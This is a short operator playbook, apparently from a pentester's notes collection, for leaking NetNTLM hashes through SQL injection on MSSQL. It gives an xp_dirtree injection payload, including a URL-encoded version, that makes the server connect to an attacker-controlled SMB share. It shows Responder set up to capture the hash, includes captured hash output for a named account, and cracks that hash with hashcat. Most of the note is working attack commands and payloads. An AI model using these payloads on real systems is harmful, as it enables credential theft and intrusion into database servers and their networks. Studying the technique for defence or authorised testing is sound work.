---
technique: "Leaking NetNTLM Hashes"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Leaking NetNTLM Hashes.md"
source_sha256: "178d1e423b3d570c536d8572b8448a8c46522748f12ab2972b36b578fcd6c1a9"
curator_version: 2
review_status: imported-unreviewed
---

# Leaking NetNTLM Hashes

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: python3.

## Quick index — payloads & commands in this note
- `python: git clone https://github.com/lgandx/Responder`
- `python: EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;`
- `python: sudo responder -vI eth0`
- `python: hashcat -m 5600 <hash> <wordlist>`

## Playbook (operator notes)

# Leaking NetNTLM Hashes

### **Capturing the Hash**

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

- Common to have MSSQL Accounts that can access `network shares`
- If we found SQLi we should be able to capture NetNTLM creds and crack them
- We will make the SQL server access an SMB share we control and capture the credentials

```python
git clone https://github.com/lgandx/Responder
sudo python3 Responder.py -I <interface>
```

<aside>
⚠️

Encode all key chars like `\` `,` etc.

</aside>

```python
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;

# Example
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
/api/check-username.php?u=%27%3BEXEC%20master..xp_dirtree%20%27%5C%5C192.168.43.164%5Cmyshare%27%2C%201%2C%201%3B--
```

```python
sudo responder -vI eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.43.156
[SMB] NTLMv2-SSP Username : SQL01\jason
[SMB] NTLMv2-SSP Hash     : jason::SQL01:bd7f162c24a39a0f:94DF80C5ABBA<SNIP>000000000
<SNIP>
```

### **Extra: Cracking the Hash**

```python
hashcat -m 5600 <hash> <wordlist>

# Example
hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB<SNIP>000000' /usr/share/wordlists/rockyou.txt
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Leaking NetNTLM Hashes.md`
